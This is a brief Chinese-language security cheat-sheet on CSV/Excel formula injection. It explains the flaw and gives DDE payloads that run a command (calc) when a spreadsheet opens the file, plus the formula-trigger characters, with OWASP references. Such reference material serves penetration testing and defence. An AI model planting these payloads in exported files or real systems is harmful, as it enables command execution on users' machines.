# CSV Excel公式注入
许多Web应用程序允许用户将诸如发票或者用户设置的模板等内容下载为CSV文件。许多用户使用Excel，Libre Office或者Open Office打开CSV文件。当一个Web应用程序没能正确验证CSV文件的内容时，将导致一个或多个单元格被执行。

## 攻击

使用动态数据交换的基本攻击：
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0

Technical Details of the above payload:
cmd is the name the server can respond to whenever a client is trying to access the server
/C calc is the file name which in our case is the calc(i.e the calc.exe)
!A0 is the item name that specifies unit of data that a server can respond when the client is requesting the data

```

任何公式都可以以下列字符开始：
```
=
+
–
@
```

## 致谢
* https://owasp.org/index.php/CSV_Excel_Macro_Injection
* https://sites.google.com/site/bughunteruniversity/nonvuln/csv-excel-formula-injection
* https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/


